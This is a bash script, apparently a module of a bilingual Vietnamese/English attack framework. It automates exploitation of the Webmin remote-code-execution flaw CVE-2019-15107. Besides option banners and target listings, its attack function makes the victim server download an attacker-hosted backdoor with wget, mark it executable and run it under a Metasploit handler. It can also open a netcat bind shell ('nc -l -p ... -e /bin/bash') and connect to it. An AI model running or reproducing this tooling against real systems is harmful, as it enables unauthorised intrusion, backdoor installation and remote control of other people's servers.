   METHOD	  $method $no    Phương pháp hậu tấn công - Dòng lệnh Netcat hoặc tệp backdoor (netcat / file).
!
		if [[ "$method_value" = "file" ]] || [[ "$method_value" = "FILE" ]] || [[ "$method_value" = "File" ]]; then
cat << !
   BACKDOOR_FILE  $backdoor_file $yes       Đường dẫn đến tệp thực thi / shell meterpreter / tải trọng.
   SRVHOST        $srvhost $no    Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ ( mặc định 0.0.0.0 ).
   SRVPORT        $srvport $no    Cổng lắng nge.
   ATTACK_TYPE    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
		fi
		if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes       Máy chủ lắng nghe trên WAN.
   PUBLICPORT     $publicport $yes       Cổng lắng nge trên WAN,cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
		else echo ""
		fi
	elif [ "$language" = "EN" ]; then
	yes="  yes"
	no="  no "
	method_value=`echo $method`
	attack_value=`echo $attack_type`
cat << !

Module options (exploit/unix/webapp/CVE-2019-15107_webmin_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   RHOST          $rhost $yes      Address or domain name of target server.
   RPORT          $rport $no	  The Webmin server service port is running.
   SSL         	  $ssl $no	  Enable connection by SSL / TLS.
   METHOD	  $method $no	  Post-attack method - Netcat Command line or backdoor file (netcat/file).
!
		if [[ "$method_value" = "file" ]] || [[ "$method_value" = "FILE" ]] || [[ "$method_value" = "File" ]]; then
cat << !
   BACKDOOR_FILE  $backdoor_file $yes      Path of an executable file / meterpreter shell / payload.
   SRVHOST        $srvhost $no	  The local host to listen on.This must be an address on the local machine ( default 0.0.0.0 ).
   SRVPORT        $srvport $no	  The local port to listen on.
   ATTACK_TYPE    $attack_type $no	  Attack type (Lan/Wan).
!
		fi
		if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on.
   PUBLICPORT     $publicport $yes      The public port to listen on,this port must match the port created on the payload.

!
		else echo ""
		fi
	fi
else
	if [ "$language" = "VN" ]; then
	yes="  Có"
	no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/unix/webapp/CVE-2019-15107_webmin_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----           --------------- 	--------  -----------
   Proxies        $proxies $no    Chuỗi định dạng proxy "type:host:port[,type:host:port][...]".
   RHOST          $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT          $rport $no    Cổng dịch vụ máy chủ Webmin đang chạy.
   SRVHOST        $srvhost $no    Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ ( mặc định 0.0.0.0 ).
   SRVPORT        $srvport $no    Cổng lắng nge.
   SSL         	  $ssl $no    Cho phép kết nối bằng SSL / TLS.
   SSLCert        $sslcert $no    Đường dẫn đến chứng chỉ SSL tùy chỉnh (mặc định được tạo ngẫu nhiên).
   TARGETURI      $targeturi $no    Đường dẫn cơ sở đến máy chủ Webmin.
   URIPATH        $uripath $no    URI để sử dụng cho khai thác (mặc định là ngẫu nhiên).
   VHOST          $vhost $no    Máy chủ ảo hóa HTTP.

!
	elif [ "$language" = "EN" ]; then
	yes="  yes"
	no="  no "
cat << !

Module options (exploit/unix/webapp/CVE-2019-15107_webmin_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   Proxies        $proxies $no      A proxy chain of format "type:host:port[,type:host:port][...]".
   RHOST          $rhost $yes      The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'.
   RPORT          $rport $no      The target port.
   SRVHOST        $srvhost $no      The local host to listen on. This must be an address on the local machine or 0.0.0.0.
   SRVPORT        $srvport $no      The local port to listen on.
   SSL         	  $ssl $no      Negotiate SSL/TLS for outgoing connections.
   SSLCert        $sslcert $no      Path to a custom SSL certificate (default is randomly generated).
   TARGETURI      $targeturi $no      Base path to Webmin.
   URIPATH        $uripath $no      The URI to use for this exploit (default is random).
   VHOST          $vhost $no      HTTP server virtual host.

!
	fi
fi
}
function module_banner_2 {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then	
	if [ "$language" = "VN" ]; then
	yes="  Có"
	no="  Không"
method_value=`echo $method`
attack_value=`echo $attack_type`
cat << !

Các tùy chọn của mô-đun (exploit/unix/webapp/CVE-2019-15107_webmin_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   RHOST          $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu
   RPORT          $rport $no    Cổng dịch vụ máy chủ Webmin đang chạy.
   SSL         	  $ssl $no    Cho phép kết nối bằng SSL / TLS.
   METHOD	  $method $no    Phương pháp hậu tấn công - Dòng lệnh Netcat hoặc tệp backdoor (netcat / file).
!
		if [[ "$method_value" = "file" ]] || [[ "$method_value" = "FILE" ]] || [[ "$method_value" = "File" ]]; then
cat << !
   BACKDOOR_FILE  $backdoor_file $yes       Đường dẫn đến tệp thực thi / shell meterpreter / tải trọng.
   SRVHOST        $srvhost $no    Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ ( mặc định 0.0.0.0 ).
   SRVPORT        $srvport $no    Cổng lắng nge.
   ATTACK_TYPE    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
		fi
		if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes       Máy chủ lắng nghe trên WAN.
   PUBLICPORT     $publicport $yes       Cổng lắng nge trên WAN,cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
		else echo ""
		fi
	elif [ "$language" = "EN" ]; then
	yes="  yes"
	no="  no "
method_value=`echo $method`
attack_value=`echo $attack_type`
cat << !

Module options (exploit/unix/webapp/CVE-2019-15107_webmin_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   RHOST          $rhost $yes      Address or domain name of target server.
   RPORT          $rport $no	  The Webmin server service port is running.
   SSL         	  $ssl $no	  Enable connection by SSL / TLS.
   METHOD	  $method $no	  Post-attack method - Netcat Command line or backdoor file (netcat/file).
!
		if [[ "$method_value" = "file" ]] || [[ "$method_value" = "FILE" ]] || [[ "$method_value" = "File" ]]; then
cat << !
   BACKDOOR_FILE  $backdoor_file $yes      Path of an executable file / meterpreter shell / payload.
   SRVHOST        $srvhost $no	  The local host to listen on.This must be an address on the local machine ( default 0.0.0.0 ).
   SRVPORT        $srvport $no	  The local port to listen on.
   ATTACK_TYPE    $attack_type $no	  Attack type (Lan/Wan).
!
		fi
		if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on.
   PUBLICPORT     $publicport $yes      The public port to listen on,this port must match the port created on the payload.

!
		else echo ""
		fi
	fi
else
	if [ "$language" = "VN" ]; then
	yes="  Có"
	no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/unix/webapp/CVE-2019-15107_webmin_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   Proxies        $proxies $no    Chuỗi định dạng proxy "type:host:port[,type:host:port][...]".
   RHOST          $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT          $rport $no    Cổng dịch vụ máy chủ Webmin đang chạy.
   SRVHOST        $srvhost $no    Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ ( mặc định 0.0.0.0 ).
   SRVPORT        $srvport $no    Cổng lắng nge.
   SSL         	  $ssl $no    Cho phép kết nối bằng SSL / TLS.
   SSLCert        $sslcert $no    Đường dẫn đến chứng chỉ SSL tùy chỉnh (mặc định được tạo ngẫu nhiên).
   TARGETURI      $targeturi $no    Đường dẫn cơ sở đến máy chủ Webmin.
   URIPATH        $uripath $no    URI để sử dụng cho khai thác (mặc định là ngẫu nhiên).
   VHOST          $vhost $no    Máy chủ ảo hóa HTTP.

!
	elif [ "$language" = "EN" ]; then
	yes="yes"
	no="no "
cat << !

Module options (exploit/unix/webapp/CVE-2019-15107_webmin_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   Proxies        $proxies $no      A proxy chain of format "type:host:port[,type:host:port][...]".
   RHOST          $rhost $yes      The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'.
   RPORT          $rport $no      The target port.
   SRVHOST        $srvhost $no      The local host to listen on. This must be an address on the local machine or 0.0.0.0.
   SRVPORT        $srvport $no      The local port to listen on.
   SSL         	  $ssl $no      Negotiate SSL/TLS for outgoing connections.
   SSLCert        $sslcert $no      Path to a custom SSL certificate (default is randomly generated).
   TARGETURI      $targeturi $no      Base path to Webmin.
   URIPATH        $uripath $no      The URI to use for this exploit (default is random).
   VHOST          $vhost $no      HTTP server virtual host.

!
	fi
fi
}
function show_platforms {
if [ "$language" = "VN" ]; then
echo -e """
Nền tảng mã khai thác:

   Id  Tên
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
elif [ "$language" = "EN" ]; then
echo -e """
Exploit code platform:

   Id  Name
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
fi
}
function platform {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	if [ "$language" = "VN" ]; then
echo -ne """
Nền tảng được chọn:

   Id  Tên
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
	elif [ "$language" = "EN" ]; then
echo -ne """
Platform selected:

   Id  Name
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
	fi
else
	if [ "$language" = "VN" ]; then
echo -ne """
Nền tảng được chọn:

   Id  Tên
   --  ----
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
	elif [ "$language" = "EN" ]; then
echo -ne """
Platform selected:

   Id  Name
   --  ----
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
	fi
fi
}
################# targets ###################
#############################################
function show_targets {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	if [ "$language" = "VN" ]; then
cat << !

Các mục tiêu có thể khai thác:

   Id  Tên
   --  ----
   0   Webmin phiên bản từ 1.882 đến 1.921 và được bật "thay đổi mật khẩu người dùng"

!
	elif [ "$language" = "EN" ]; then
cat << !

Exploit targets:

   Id  Name
   --  ----
   0   Webmin version 1.882 through 1.921 and enabled "user password change"

!
	fi
else
	if [ "$language" = "VN" ]; then
cat << !

Các mục tiêu có thể khai thác:
  
   Id  Tên
   --  ----
   0   Tự động (Bộ nhớ trong Unix)
   1   Tự động (Linux ống nhỏ giọt)
       ,----------------------------------------------.
       |    Mục tiêu bao gồm các phiên bản Webmin     |
       |----------------------------------------------|
       |       phiên bản từ 1.882 đến 1.921           |
       |  và được bật "thay đổi mật khẩu người dùng"  |
       '----------------------------------------------'

!
	elif [ "$language" = "EN" ]; then
cat << !

Exploit targets:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
   1   Automatic (Linux Dropper)
       ,----------------------------------------------.
       |    Targets includes Webmin versions          |
       |----------------------------------------------|
       |       version 1.882 through 1.921            |
       |     and enabled "user password change"       |
       '----------------------------------------------'

!
	fi
fi
}

function target {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	if [ "$language" = "VN" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   0   Webmin phiên bản từ 1.882 đến 1.921 và được bật "thay đổi mật khẩu người dùng"

!
	elif [ "$language" = "EN" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   0   Webmin version 1.882 through 1.921 and enabled "user password change"

!
	fi
else
	if [ "$language" = "VN" ]; then
		if [ "$target" = "0" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   0   Tự động (Bộ nhớ trong Unix)

!
		elif [ "$target" = "1" ]; then
cat << !
Mục tiêu khai thác:

   Id  Tên
   --  ----
   1   Tự động (Linux ống nhỏ giọt)

!
		fi
	elif [ "$language" = "EN" ]; then
		if [ "$target" = "0" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)

!
		elif [ "$target" = "1" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   1   Automatic (Linux Dropper)

!
		fi
	fi
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   cmd/unix/" >> $payload_list_file
cat $payload_data | grep -i "   generic/custom" > $payload_list_file
cat $payload_data | grep -i "   generic/shell" > $payload_list_file
cat $payload_data | grep -i "   java/" >> $payload_list_file
cat $payload_data | grep -i "   linux/" >> $payload_list_file
cat $payload_data | grep -i "   php/" >> $payload_list_file
cat $payload_data | grep -i "   python/" >> $payload_list_file
cat $payload_data | grep -i "   ruby/" >> $payload_list_file
echo "" >> $payload_list_file
}
function out_value {
rhost=`echo $rhost`
rport=`echo $rport`
method=`echo $method`
backdoor_file=`echo $backdoor_file`
attack_type=`echo $attack_type`
type_file=`echo $type_file`
publichost=`echo $publichost`
publicport=`echo $publicport`
paylo=`echo $paylo`
lhost=`echo $lhost`
lport=`echo $lport`
host=`echo $srvhost`
ssl=`echo $ssl`
if [[ "$ssl" = "true" ]] || [[ "$ssl" = "TRUE" ]] || [[ "$ssl" = "True" ]]; then
	s="https"
else
	s="http"
fi
file_ip="ip.txt"
if [ "$host" = "0.0.0.0" ]; then
	srvhost=`echo $lhost`
else
	srvhost=$host
fi
srvport=`echo $srvport`
platform=`echo $platform`
proxies=`echo $proxies`
sslcert=`echo $sslcert`
targeturi=`echo $targeturi`
uripath=`echo $uripath`
vhost=`echo $vhost`
target=`echo $target`
}
function check {
ssl=`echo $ssl`
rhost=`echo $rhost`
rport=`echo $rport`
ssl=`echo $ssl`
if [[ "$ssl" = "true" ]] || [[ "$ssl" = "TRUE" ]] || [[ "$ssl" = "True" ]]; then
	s="https"
else
	s="http"
fi
path_tool="../../Tools/Vulnerability-Exploit/CVE-2019-15107/"
cd $path_tool
file_ip="ip.txt"
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
bash CVE-2019-15107_check.sh -p $rport -s $s
cd $path_present
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	echo "use multi/handler" >> $rc_file
else
	echo "use exploit/unix/webapp/webmin_backdoor" >> $rc_file
fi
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/CVE-2019-15107/"
cd $path_tool
file_ip="ip.txt"
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
check_host=`bash CVE-2019-15107_check.sh -p $rport -s $s | grep CVE-2019-15107`
if [[ "$check_host" != "" ]]; then
	if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
		if [[ "$method" = "file" ]] || [[ "$method" = "FILE" ]] || [[ "$method" = "File" ]]; then
			if [[ "$paylo" != "" ]]; then
				if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
					url="http://$publichost:$srvport/$backdoor_name"
					echo "set ReverseListenerBindAddress $lhost" >> $rc_file
					echo "set LHOST $publichost" >> $rc_file
					echo "set LPORT $lport" >> $rc_file
				else
					url="http://$srvhost:$srvport/$backdoor_name"
					echo "set LHOST $lhost" >> $rc_file
					echo "set LPORT $lport" >> $rc_file
				fi
				echo "exploit -j -z" >> $rc_file
				service postgresql start
				cp $backdoor_file $path_tool > /dev/null 2>&1
				cd $path_tool
				if [[ "$type_file" = "py" ]]; then
					run="python "
				elif [[ "$type_file" = "rb" ]]; then
					run="ruby "
				elif [[ "$type_file" = "pl" ]]; then
					run="perl "
				elif [[ "$type_file" = "php" ]]; then
					run="php "
				elif [[ "$type_file" = "war" ]]; then
					run="java -jar "
				else
					run="./" 
				fi
				echo -e "${BlueF}[*]$RESET $start_server http://$srvhost:$srvport"		
				xterm -title "Backdoor Service" -e python2 -m SimpleHTTPServer $srvport &
				echo -e "${BlueF}[!]$RESET $session ${red}Metasploit Framework${RESET}"
				python CVE-2019-15107.py $s://$rhost:$rport "wget $url -O $backdoor_name" > /dev/null 2>&1
				python CVE-2019-15107.py $s://$rhost:$rport "chmod 755 $backdoor_name" > /dev/null 2>&1
				killall xterm > /dev/null 2>&1
				echo "python CVE-2019-15107.py $s://$rhost:$rport \"$run$backdoor_name\" > /dev/null 2>&1 &" > injectshell.sh
				chmod 755 injectshell.sh
				echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
				msfconsole -q -r $rc_file -x "bash injectshell.sh;cd ../../../Victim"
				rm $path_tool/injectshell.sh > /dev/null 2>&1
				rm $path_tool/$backdoor_name > /dev/null 2>&1
				killall xterm > /dev/null 2>&1
				cd $path_present
			else
				cp $backdoor_file $path_tool > /dev/null 2>&1
				cd $path_tool
				if [[ "$type_file" = "py" ]]; then
					run="python "
				elif [[ "$type_file" = "rb" ]]; then
					run="ruby "
				elif [[ "$type_file" = "pl" ]]; then
					run="perl "
				elif [[ "$type_file" = "php" ]]; then
					run="php "
				elif [[ "$type_file" = "war" ]]; then
					run="java -jar "
				else
					run="./" 
				fi
				echo -e "${BlueF}[*]$RESET $start_server http://$srvhost:$srvport"		
				xterm -title "Backdoor Service" -e python2 -m SimpleHTTPServer $srvport &
				python CVE-2019-15107.py $s://$rhost:$rport "wget $url -O $backdoor_name" > /dev/null 2>&1
				python CVE-2019-15107.py $s://$rhost:$rport "chmod 755 $backdoor_name" > /dev/null 2>&1
				killall xterm > /dev/null 2>&1
				rm $path_tool/$backdoor_name > /dev/null 2>&1
				killall xterm > /dev/null 2>&1
				cd $path_present
			fi
		else
			cd $path_tool
			while true;do
			radom=$(( $RANDOM % 65535 ))
			check_port=`python CVE-2019-15107.py $s://$rhost:$rport "cat /etc/services | awk '{ print $2 }' | cut -d'/' -f1 | grep -w $radom"`
			check_port=`echo $check_port | awk '{ print $2 }'`
			if [ "$check_port" = "" ]; then
				open_port="$radom"
				break
			fi	
			done
			echo -e "${BlueF}[!]$RESET $session ${red}Netcat${RESET}"
			python CVE-2019-15107.py $s://$rhost:$rport "nc -nvv -l -p $open_port -e /bin/bash" > /dev/null 2>&1 &
			echo -e "${BlueF}[!]$RESET $nc_start ${red}Netcat${RESET}"
			while true;do
			check_open=`nmap $rhost -p $open_port | grep -w open`
			if [ "$check_open" != "" ]; then
				break
			fi 
			done
			cd ../../../Victim
			nc -nvv $rhost $open_port
			killall xterm > /dev/null 2>&1
			cd $path_present
		fi
	else
		echo "set Proxies $proxies" >> $rc_file
		echo "set RHOSTS $rhost" >> $rc_file
		echo "set RPORT $rport" >> $rc_file
		echo "set SRVHOST $srvhost" >> $rc_file
		echo "set SRVPORT $srvport" >> $rc_file
		echo "set SSL $ssl" >> $rc_file
		echo "set SSLCert $sslcert" >> $rc_file
		echo "set TARGETURI $targeturi" >> $rc_file
		echo "set URIPATH $uripath" >> $rc_file
		echo "set VHOST $vhost" >> $rc_file
		echo "set LHOST $lhost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
		echo "set TARGET $target" >> $rc_file
		echo "exploit -j -z" >> $rc_file
		service postgresql start
		cd ../../../Victim
		echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
		msfconsole -q -r $rc_file
		cd $path_present
	fi
else
echo -e "${red}[-]$RESET $not_vuln $s://$rhost:$rport"
cd $path_present
fi
}
